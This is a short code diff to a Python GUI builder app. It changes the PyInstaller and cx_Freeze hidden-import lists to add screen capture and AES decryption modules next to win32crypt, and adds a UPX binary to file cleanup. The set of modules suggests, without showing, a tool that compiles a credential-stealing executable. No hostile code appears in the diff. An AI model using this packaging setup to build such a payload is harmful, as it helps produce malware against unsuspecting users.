@@ -446,7 +446,10 @@ class App(customtkinter.CTk):
                             "--hidden-import", "requests_toolbelt",
                             "--hidden-import", "psutil",
                             "--hidden-import", "PIL",
-                            "--hidden-import", "pycryptodome",
+                            "--hidden-import", "PIL.ImageGrab",
+                            "--hidden-import", "Cryptodome",
+                            "--hidden-import", "Cryptodome.Cipher",
+                            "--hidden-import", "Cryptodome.Cipher.AES",
                             "--hidden-import", "win32crypt",
                             "--icon", exeicon, f"./{filename}.py"])
 
@@ -467,7 +470,10 @@ class App(customtkinter.CTk):
                 "--includes", "requests_toolbelt",
                 "--includes", "psutil",
                 "--includes", "PIL",
-                "--includes", "crypto",
+                "--includes", "PIL.ImageGrab",
+                "--includes", "Cryptodome",
+                "--includes", "Cryptodome.Cipher",
+                "--includes", "Cryptodome.Cipher.AES",
                 "--includes", "win32crypt"
             ]
             if exeicon != "NONE":
@@ -476,7 +482,7 @@ class App(customtkinter.CTk):
 
     def cleanup_files(self, filename):
         cleans_dir = {'./__pycache__', './build'}
-        cleans_file = {f'./{filename}.spec', f'./{filename}.py'}
+        cleans_file = {f'./{filename}.spec', f'./{filename}.py', "./tools/upx.exe"}
 
         for clean in cleans_dir:
             try:
